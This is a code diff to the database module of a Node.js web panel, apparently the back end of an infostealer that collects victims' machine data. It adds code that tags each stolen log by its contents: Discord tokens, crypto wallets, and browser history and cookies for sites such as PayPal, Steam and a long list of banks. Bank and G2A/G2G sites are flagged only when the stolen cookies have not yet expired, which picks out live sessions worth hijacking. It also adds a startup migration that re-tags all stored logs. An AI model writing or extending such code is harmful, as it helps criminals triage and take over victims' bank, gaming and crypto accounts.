@@ -4,6 +4,166 @@ const bcrypt = require('bcrypt');
 
 const DB_PATH = path.join(__dirname, 'webpanel.db');
 
+// Helper function to check if a cookie is non-expired
+const isCookieNonExpired = (cookie) => {
+    if (!cookie.expires && !cookie.expires_utc) return true; // Session cookies (no expiry) are valid
+    
+    try {
+        let expiryTimestamp = cookie.expires || cookie.expires_utc;
+        if (typeof expiryTimestamp === 'string') {
+            const parsed = Date.parse(expiryTimestamp);
+            if (!isNaN(parsed)) {
+                expiryTimestamp = parsed / 1000;
+            }
+        }
+        // Chrome stores expires_utc as microseconds since 1601
+        if (expiryTimestamp > 13000000000000) {
+            expiryTimestamp = (expiryTimestamp / 1000000) - 11644473600;
+        }
+        // If it's in seconds since 1970, compare with current time
+        const currentTimestamp = Math.floor(Date.now() / 1000);
+        return expiryTimestamp > currentTimestamp;
+    } catch (e) {
+        return true; // If parsing fails, assume it's valid
+    }
+};
+
+// Function to extract tags from merged pcData
+const extractTagsFromPcData = (pcData) => {
+    const tags = [];
+    if (!pcData) return tags;
+    
+    // Check for Discord tokens
+    if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
+        tags.push({ label: 'Discord (token)', color: '#5865F2' });
+    }
+    
+    // Check browser history and cookies for sites
+    const allUrls = [];
+    const historyUrls = [];
+    const cookieData = [];
+    
+    // Extract URLs from browser history
+    if (pcData.browserHistory) {
+        const history = pcData.browserHistory;
+        ['chromeHistory', 'firefoxHistory', 'edgeHistory', 'operaHistory', 'braveHistory'].forEach(browser => {
+            if (history[browser] && Array.isArray(history[browser])) {
+                history[browser].forEach(entry => {
+                    if (entry.url) {
+                        const url = entry.url.toLowerCase();
+                        allUrls.push(url);
+                        historyUrls.push(url);
+                    }
+                });
+            }
+        });
+    }
+    
+    // Extract domains from cookies with expiration info
+    if (pcData.browserCookies) {
+        let cookies = [];
+        if (typeof pcData.browserCookies === 'string') {
+            try {
+                cookies = JSON.parse(pcData.browserCookies);
+            } catch (e) {
+                // If parsing fails, try to extract domains from string
+                const domainMatches = pcData.browserCookies.match(/"domain"\s*:\s*"([^"]+)"/gi);
+                if (domainMatches) {
+                    domainMatches.forEach(match => {
+                        const domainMatch = match.match(/"([^"]+)"$/);
+                        if (domainMatch && domainMatch[1]) {
+                            const domain = domainMatch[1].toLowerCase();
+                            allUrls.push(domain);
+                            cookieData.push({ domain: domain, expires: null });
+                        }
+                    });
+                }
+            }
+        } else if (Array.isArray(pcData.browserCookies)) {
+            cookies = pcData.browserCookies;
+        }
+        
+        if (Array.isArray(cookies)) {
+            cookies.forEach(cookie => {
+                if (cookie.domain || cookie.host) {
+                    const domain = (cookie.domain || cookie.host).toLowerCase();
+                    allUrls.push(domain);
+                    cookieData.push({
+                        domain: domain,
+                        expires: cookie.expires || cookie.expires_utc || null
+                    });
+                }
+            });
+        }
+    }
+    
+    // Site detection patterns - sites that require non-expired cookies
+    const cookieRequiredSites = {
+        'G2G': ['g2g.com'],
+        'G2A': ['g2a.com'],
+        'Banking': [
+            'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citibank.com', 'usbank.com',
+            'pnc.com', 'tdbank.com', 'capitalone.com', 'americanexpress.com', 'discover.com',
+            'barclays.com', 'hsbc.com', 'jpmorgan.com', 'morganstanley.com', 'goldmansachs.com',
+            'schwab.com', 'fidelity.com', 'vanguard.com', 'etrade.com', 'ally.com',
+            'synchrony.com', 'regions.com', 'suntrust.com', 'bbt.com', 'keybank.com',
+            'huntington.com', 'fifththird.com', 'm&t.com', 'citizensbank.com', 'td.com'
+        ]
+    };
+    
+    // Site detection patterns - sites that don't require cookie expiration check
+    const sitePatterns = {
+        'YouTube': ['youtube.com', 'youtu.be', 'youtube-nocookie.com'],
+        'Microsoft': ['microsoft.com', 'office.com', 'outlook.com', 'live.com', 'hotmail.com', 'onedrive.com', 'azure.com', 'microsoftonline.com'],
+        'Google': ['google.com', 'gmail.com', 'googlemail.com', 'googletagmanager.com', 'googleapis.com', 'googleusercontent.com'],
+        'Facebook': ['facebook.com', 'fb.com', 'messenger.com'],
+        'Twitter': ['twitter.com', 'x.com', 't.co'],
+        'Instagram': ['instagram.com'],
+        'TikTok': ['tiktok.com'],
+        'Reddit': ['reddit.com'],
+        'Amazon': ['amazon.com', 'amazon.co.uk', 'amazon.de', 'amazon.fr'],
+        'Steam': ['steamcommunity.com', 'steampowered.com', 'steam-chat.com'],
+        'Epic Games': ['epicgames.com', 'unrealengine.com'],
+        'PayPal': ['paypal.com'],
+        'GitHub': ['github.com'],
+        'Netflix': ['netflix.com'],
+        'Spotify': ['spotify.com'],
+        'Discord': ['discord.com', 'discordapp.com', 'discord.gg'],
+    };
+    
+    // Check cookie-required sites (only show if non-expired cookies exist)
+    Object.keys(cookieRequiredSites).forEach(siteName => {
+        const patterns = cookieRequiredSites[siteName];
+        const foundInHistory = historyUrls.some(url => patterns.some(pattern => url.includes(pattern)));
+        
+        // Check if there are non-expired cookies for this site
+        const hasNonExpiredCookie = cookieData.some(cookie => {
+            const matchesDomain = patterns.some(pattern => cookie.domain.includes(pattern));
+            return matchesDomain && isCookieNonExpired(cookie);
+        });
+        
+        if ((foundInHistory || hasNonExpiredCookie) && !tags.some(t => t.label.includes(siteName))) {
+            tags.push({ label: siteName, color: siteName === 'Banking' ? '#ef4444' : '#60a5fa' });
+        }
+    });
+    
+    // Check for regular sites (from history or cookies, no expiration requirement)
+    Object.keys(sitePatterns).forEach(siteName => {
+        const patterns = sitePatterns[siteName];
+        const found = allUrls.some(url => patterns.some(pattern => url.includes(pattern)));
+        if (found && !tags.some(t => t.label.includes(siteName))) {
+            tags.push({ label: siteName, color: '#60a5fa' });
+        }
+    });
+    
+    // Check for crypto wallets
+    if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
+        tags.push({ label: 'Crypto Wallet', color: '#f59e0b' });
+    }
+    
+    return tags;
+};
+
 let db;
 try {
     db = new Database(DB_PATH);
@@ -349,11 +509,15 @@ const logsDb = {
                 }
             }
             
+            // Extract tags from merged data
+            const mergedTags = extractTagsFromPcData(mergedPcData);
+            
             const mergedDataSummary = {
                 historyEntries: totalHistoryEntries,
                 processes: (mergedPcData.runningProcesses || []).length,
                 installedApps: (mergedPcData.installedApps || []).length,
-                cookies: cookieCount
+                cookies: cookieCount,
+                tags: mergedTags
             };
             
             console.log(`Merged log summary - cookies: ${cookieCount}, browserCookies type: ${typeof mergedPcData.browserCookies}, isArray: ${Array.isArray(mergedPcData.browserCookies)}`);
@@ -581,12 +745,60 @@ const logsDb = {
             onlineClients,
             deadClients
         };
+    },
+    
+    // Regenerate tags for all logs that don't have them
+    regenerateTags: () => {
+        try {
+            const logs = db.prepare('SELECT id, data_summary, pc_data FROM logs').all();
+            let updated = 0;
+            
+            logs.forEach(log => {
+                try {
+                    const dataSummary = JSON.parse(log.data_summary || '{}');
+                    const pcData = JSON.parse(log.pc_data || '{}');
+                    
+                    // Regenerate tags from pcData
+                    const tags = extractTagsFromPcData(pcData);
+                    dataSummary.tags = tags;
+                    
+                    // Update the log
+                    db.prepare('UPDATE logs SET data_summary = ? WHERE id = ?').run(
+                        JSON.stringify(dataSummary),
+                        log.id
+                    );
+                    updated++;
+                } catch (e) {
+                    console.error(`Error regenerating tags for log ${log.id}:`, e);
+                }
+            });
+            
+            console.log(`Regenerated tags for ${updated} logs`);
+            return updated;
+        } catch (error) {
+            console.error('Error in regenerateTags:', error);
+            throw error;
+        }
     }
 };
 
 // Initialize database on module load
 try {
     initDatabase();
+    
+    // Auto-migrate: Regenerate tags for logs that don't have them
+    console.log('Checking for logs without tags...');
+    const logsWithoutTags = db.prepare(`
+        SELECT COUNT(*) as count FROM logs 
+        WHERE data_summary NOT LIKE '%"tags":%' OR data_summary IS NULL
+    `).get().count;
+    
+    if (logsWithoutTags > 0) {
+        console.log(`Found ${logsWithoutTags} logs without tags, regenerating...`);
+        logsDb.regenerateTags();
+    } else {
+        console.log('All logs have tags.');
+    }
 } catch (error) {
     console.error('Failed to initialize database:', error);
     console.error('Stack trace:', error.stack);
